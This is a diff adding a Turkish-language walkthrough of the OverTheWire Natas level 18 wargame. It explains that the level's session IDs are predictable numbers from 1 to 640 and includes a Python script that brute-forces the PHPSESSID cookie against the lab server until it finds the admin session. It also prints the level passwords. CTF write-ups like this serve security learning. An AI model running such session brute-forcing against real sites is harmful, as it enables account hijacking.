@@ -105,3 +105,62 @@ for i in range(32):
 >> natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
 
 #### Level 18
+
+<figure>
+<img src="/assets/img/natas/natas181.png">
+</figure>
+
+<figure>
+<img src="/assets/img/natas/natas182.png">
+</figure>
+
+Cookie başlığında  PHPSESSID değeri varsa , session başlatılıyor. Ardından print_credentials fonksiyonu çağrılıyor. Eğer '$-SESSION' içerisinde ki admin değeri 1' eşitse level 19'a ait parola ekrana bastırılıyor.
+
+PHPSESSID değeri yok ise, yeni bir session yaratılıyor.Burada createID() şeklinde bir fonksiyon çağırılmış.
+{% highlight php %}
+<?
+function createID($user) { /* {{{ */ 
+    global $maxid; 
+    return rand(1, $maxid); 
+}
+?>
+{% endhighlight %}
+
+Fonksiyon session_id olarak 1 ile maxid değeri arasında random bir değer döndürüyor. 
+
+
+<figure>
+<img src="/assets/img/natas/natas183.png">
+</figure>
+
+Değer 640 olarak tanımlanırken, "640 should be enough for everyone" şeklinde bir not düşülmüş. Burdan anlıyoruz ki admin dahil tüm kullanıcılar için session_id değeri 1 ile 640 arasında.
+
+{% highlight python %}
+
+import requests
+from requests.auth import HTTPBasicAuth
+auth=HTTPBasicAuth('natas18','xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
+for id in range(1,640):
+               payload = {"username": "aa", "password": "aa"}
+               id=str(id)
+               cookie={'PHPSESSID':''+id+''}
+               print cookie
+               s=requests.post('http://natas18.natas.labs.overthewire.org/index.php',auth=auth,data=payload,cookies=cookie)
+               if "You are an admin" in s.text:
+                        print id
+                        print s.text
+                        break
+
+{% endhighlight %}
+
+<figure>
+<img src="/assets/img/natas/natas183.png">
+</figure>
+
+<figure>
+<img src="/assets/img/natas/natas184.png">
+</figure>
+
+>> natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
+
+#### Level 19
